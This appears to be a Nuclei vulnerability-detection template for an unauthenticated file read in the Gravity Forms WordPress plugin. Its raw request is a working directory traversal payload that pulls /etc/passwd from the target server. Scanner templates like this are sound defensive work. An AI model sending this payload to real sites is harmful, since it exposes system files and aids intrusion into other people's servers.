id: CVE-2026-12997
info:
  name: Gravity Forms <= 2.10.4 - Unauthenticated Arbitrary File Read
  author: rool-machine
  severity: high
  description: The Gravity Forms plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 2.10.4 via the 'gform_uploaded_files' parameter.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/gravityforms/gravity-forms-2104-unauthenticated-arbitrary-file-read-via-gform-uploaded-files-parameter
  tags: cve,cve2026,wordpress,wp-plugin,gravityforms,lfi
http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=process_send_resume_link&gform_send_resume_link=1&gform_uploaded_files={"test":"../../../../../../../../../../etc/passwd"}&email=test@example.com
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:x:0:0"
        part: body
      - type: status
        status:
          - 200
